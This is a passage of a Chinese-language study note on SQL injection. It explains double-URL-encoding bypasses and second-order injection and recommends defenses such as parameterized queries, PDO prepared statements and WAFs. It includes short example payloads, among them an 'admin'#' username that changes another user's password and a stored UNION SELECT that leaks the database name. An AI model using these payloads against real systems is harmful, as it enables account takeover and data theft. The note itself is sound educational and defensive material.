title="二次编码注入原理"></a>二次编码注入原理</h5><ol><li>用户输入<code>id=1%27</code>,会被php转码为<code>id=1&#39;</code></li><li>转义代码发现有单引号,转义为<code>id=1\&#39;</code>,无法sql注入</li><li>用户输入<code>id=1%2527</code>,由于%25转码后就是%,因而会转码为<code>id=1%27</code></li><li>转义代码没有发现单引号,故不转义</li><li>但后续urldecode等函数,处理url时,会将<code>id=1%27</code>转码为<code>id=1&#39;</code>,就可以注入<br>注意:如果做白盒测试,要看urldecode函数 是否在转义方法之后</li></ol><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>#####二次注入原理</p><ol><li>插入恶意数据<br>有些程序在进行数据库插入的时候,仅仅对特殊字符进行了转义,但仍然将数据写入了数据库,如果插入的数据包含恶意内容的话</li><li>引用恶意数据<br>在插入到数据库中后,在另外的地方查询该数据的时候,如果没有对取出的数据做校验处理(即认为可信),直接使用该数据,就会造成sql二次注入</li></ol><h5 id="二次注入举例"><a href="#二次注入举例" class="headerlink" title="二次注入举例"></a>二次注入举例</h5><p>举例1如下:</p><ol><li>新建用户<code>admin&#39;#</code>,有特殊字符,但写入成功,并能使用该用户登录</li><li>正常修改用户密码时<br>sql语句如是:<code>update user set password=&#39;1234&#39; where username=&#39;x&#39; and psssword=&#39;xx&#39;</code></li><li>但当用户为<code>admin&#39;#</code>时<br>sql语句变为:<code>update user set password=&#39;1234&#39; where username=&#39;admin&#39;#&#39; and xxxxx</code><br>明显井号后的语句都被注释掉了</li><li>结果就是会修改掉原有用户admin的密码</li></ol><p>举例2如下:</p><ol><li>有两个页面,一个页面写入数据,另一个页面可以有办法查看该数据</li><li>如果写入时,写入了<code>xx&#39; union select 1,database(),3</code></li><li>如果存在sql注入漏洞,写入的数据应该为<code>1,库名,3</code></li><li>在另一个页面就可以看到该库名数据</li></ol><h4 id="二次注入防御"><a href="#二次注入防御" class="headerlink" title="二次注入防御"></a>二次注入防御</h4><ol><li>对外部提交的数,需要更加谨慎处理,特殊字符不写入</li><li>程序内部的数据调用,也要进行严格检查,不要认为可信</li></ol><h3 id="注入防范方法"><a href="#注入防范方法" class="headerlink" title="注入防范方法"></a>注入防范方法</h3><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：</p><h4 id="代码层面："><a href="#代码层面：" class="headerlink" title="代码层面："></a>代码层面：</h4><ol><li>对输入进行严格的转义和过滤</li><li>使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</li><li>PDO预处理 (Java、PHP防范推荐方法：)<br>没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入。<br>PDO数据库抽象层学习：<a href="http://www.php.cn/course/868.html">http://www.php.cn/course/868.html</a></li></ol><h4 id="网络层面："><a href="#网络层面：" class="headerlink" title="网络层面："></a>网络层面：</h4><ol><li>通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</li><li>云端防护（360网站卫士，阿里云盾等）</li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
